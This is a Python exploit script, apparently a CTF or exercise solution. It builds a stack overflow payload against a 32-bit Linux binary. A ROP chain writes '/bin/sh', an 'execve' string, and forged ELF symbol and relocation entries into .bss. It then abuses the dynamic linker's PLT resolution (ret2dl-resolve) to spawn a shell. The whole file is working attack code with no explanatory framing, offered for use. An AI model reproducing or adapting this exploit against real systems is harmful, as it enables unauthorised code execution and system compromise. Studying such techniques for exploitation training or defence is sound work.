import sys
import json
import subprocess
from helper import *

GADGET_SIZE = 4
R_386_JUMP_SLOT = 0x7
DWORD_SIZE = 4

read_offset = 0x000e3e10
offset_execv_read = (0x000bd890 - read_offset) & 0xffffffff
offset_binsh_read = (0x00166046 - read_offset) & 0xffffffff

def call(config, function_name, parameters):
    if len(parameters) > GADGET_SIZE:
        raise "Too many parameters, find a better gadget"

    return int2le(config[function_name]) + \
           int2le(config["base"] + config["gadget"]) + \
           "".join(map(str, map(int2le, parameters))) + \
           int2le(0xdeadb00b) * (GADGET_SIZE - len(parameters))

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + 16 - offset
    

def main():
    #config = json.loads(subprocess.check_output("./offsets"))
    config = json.loads(open("config.json", "r").read())

    config["sip_offset"] = hex(int(config["sip_offset"], 10))
    for key in config:
        config[key] = int(config[key], 16)

    buffer = config["bss"]
    relocation_target = buffer
    buffer += DWORD_SIZE

    pointer_to_null = buffer
    buffer += DWORD_SIZE

    binsh = buffer
    buffer += 2 * DWORD_SIZE

    execv_size = DWORD_SIZE * 2
    execv_str = align(buffer, config["dynstr"], 1) # alignment is useless here

    buffer = execv_str + execv_size
    sym_size = DWORD_SIZE * 4
    symbol = align(buffer, config["dynsym"], sym_size)
    symbol_offset = ((symbol - config["dynsym"]) / sym_size)

    buffer = symbol + sym_size
    reloc_size = DWORD_SIZE * 2
    reloc  = align(buffer, config["rel.plt"], reloc_size)

    new_stack = config["bss"] + 1024

    exploit = "A" * config["sip_offset"]

    # Pointer to NULL
    exploit += call(config, "writemem", [pointer_to_null, 0])

    # /bin/sh
    exploit += call(config, "writemem", [binsh, le2int('/bin')])
    exploit += call(config, "writemem", [binsh + 4, le2int('/sh\0')])


    # No versioning
    # edx + edi * 2
    exploit += call(config, "writemem", [0x80497e4, 0x80482b0 - 2 * symbol_offset + 2 * 2])

    # String
    exploit += call(config, "writemem", [execv_str, le2int('exec')])
    exploit += call(config, "writemem", [execv_str + 4, le2int('ve\0\0')])

    # Elf32_Sym
    #exploit += call(config, "writemem", [symbol, execv_str - config["dynstr"]]) # st_name
    exploit += call(config, "writemem", [symbol, execv_str - config["dynstr"]]) # st_name
    exploit += call(config, "writemem", [symbol + 4, 0]) # st_value
    exploit += call(config, "writemem", [symbol + 8, 0]) # st_size
    exploit += call(config, "writemem", [symbol + 12, 0x12]) # st_info, st_other, st_shndx

    # Elf32_Rel 
    exploit += call(config, "writemem", [reloc, relocation_target]) # r_offset
    exploit += call(config, "writemem", [reloc + 4, (symbol_offset << 8) | R_386_JUMP_SLOT]) # r_info

    # Launch
    reloc_size = 1
    exploit += int2le(config["plt"]) + int2le((reloc - config["rel.plt"]) / reloc_size)

    exploit += int2le(0xdeadb00b) + int2le(binsh) + int2le(pointer_to_null) + int2le(pointer_to_null) + int2le(4)

    write_string(exploit)

if __name__ == "__main__":
    main()
